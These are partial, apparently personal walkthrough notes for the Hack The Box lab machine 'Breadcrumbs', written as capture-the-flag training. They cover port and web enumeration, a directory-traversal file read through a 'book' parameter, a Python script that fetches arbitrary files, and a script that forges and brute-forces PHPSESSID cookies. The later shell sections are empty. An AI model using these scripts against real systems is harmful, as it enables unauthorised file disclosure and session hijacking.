HTB - Breadcrumbs

=== RECON ===
Nmap
$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.228
$ nmap -p 22,80,135,139,443,445,3306,5040,7680,49664-49669 -sC -sV -oA scans/nmap-tcpscripts
* Poke at ports with curl and nc

SMB - TCP 445
$ smbmap -H 10.10.10.228 -> auth error
$ echo exit | smbclient -L \\\\10.10.10.228 -> session setup failed

Website - TCP 80/443
- Check books link -> /php/books.php
    - Search for books by title
    - HTTP request made contains filename as parameter -> Check file include and directory traversal
    - Request prepends ../books/ to filename -> loads content with file_get_contents -> display source code but no code execution
    - book=..\includes\bookController.php -> source code for the page
$ gobuster dir -u http://10.10.10.228 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php -o scans/gobuster-80-small-php
- /db has directory listing on
- /portal -> /portal/login.php -> login form
    - Helper link leads to /portal/php/admins.php
    - Use sign up link to get access
- File management page hangs with 302 -> catch in burp and change 302 to 200 OK since there is full page
    - File upload page but no access

=== SHELL AS WWW-DATA ===
Pull Source Files
- file_get_contents returns poorly formatted string -> write python script
#!/usr/bin/env python3
import requests
import sys
if len(sys.argv) != 2:
    print(f'[-] Usage: {sys.argv[0]} [path]')
    sys.exit()
resp = requests.post('http://10.10.10.228/includes/bookController.php',
        data = {'book': f'../{sys.argv[1]}', 'method': '1'})
print(bytes(resp.text, "utf-8").decode('unicode_escape').strip('"'))
$ python3 get_file.py /index.php

Enumerate Login
- db/db.php has creds

Forge PHPSESSID
- Cookie is generated by pulling char from username -> adding static chars -> taking hash
    - Number of possible cookies for username is length of username
- Write python script to check all possible cookies
#!/usr/bin/env python3
import hashlib
import requests
users = "alex,paul,jack,olivia,john,emma,william,lucas,sirine,juliette,support".split(",")
for user in users:
    print(f"\r[*] Trying cookies for {user}" + 20*" ", end="", flush=True)
    for c in user:
        h = hashlib.md5(f"s4lTy_stR1nG_{c}(!528./9890".encode('utf-8')).hexdigest()
        cookie = f"{user}{h}"
        resp = requests.get('http://10.10.10.228/portal/index.php', cookies={"PHPSESSID": cookie})
        if user in resp.text.lower():
            print(f"\r[+] Found cookie for {user}: {cookie}")
print("\r" + 40*" ")
$ python3 test_cookies.py -> finds 3 valid cookies
- Paul is admin according to users page -> start with that account

Forge JWT
- Other cookie is named token and it's a JWT

=== SHELL AS JULIETTE ===

=== SHELL AS ADMINISTRATOR ===

=== BEYOND ROOT ===

